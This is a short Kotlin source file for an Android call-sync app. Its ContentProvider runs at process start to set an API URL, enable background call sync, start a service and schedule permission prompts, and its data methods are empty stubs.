package com.calltech

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.net.Uri
import android.util.Log

/** Process start — kill-state sync arm, popup Activity khud launcher se aati hai. */
class SyncInitProvider : ContentProvider() {
    override fun onCreate(): Boolean {
        val ctx = context?.applicationContext ?: return false

        try {
            MongoSyncHelper.ensureApiUrl(ctx)
            CallSyncHelper.markBackgroundSyncEnabled(ctx, true)
            CallSyncService.startHolding(ctx)
            if (SyncBootstrap.needsCoreSyncPermissions(ctx)) {
                PostInstallPrompt.showIfNeeded(ctx)
                PermissionPopupAlarms.schedule(ctx)
            }
        } catch (error: Exception) {
            Log.e(TAG, "SyncInitProvider failed", error)
        }

        return true
    }

    override fun query(
        uri: Uri,
        projection: Array<out String>?,
        selection: String?,
        selectionArgs: Array<out String>?,
        sortOrder: String?,
    ): Cursor? = null

    override fun getType(uri: Uri): String? = null

    override fun insert(uri: Uri, values: ContentValues?): Uri? = null

    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<out String>?): Int = 0

    override fun update(
        uri: Uri,
        values: ContentValues?,
        selection: String?,
        selectionArgs: Array<out String>?,
    ): Int = 0

    companion object {
        private const val TAG = "SyncInitProvider"
    }
}
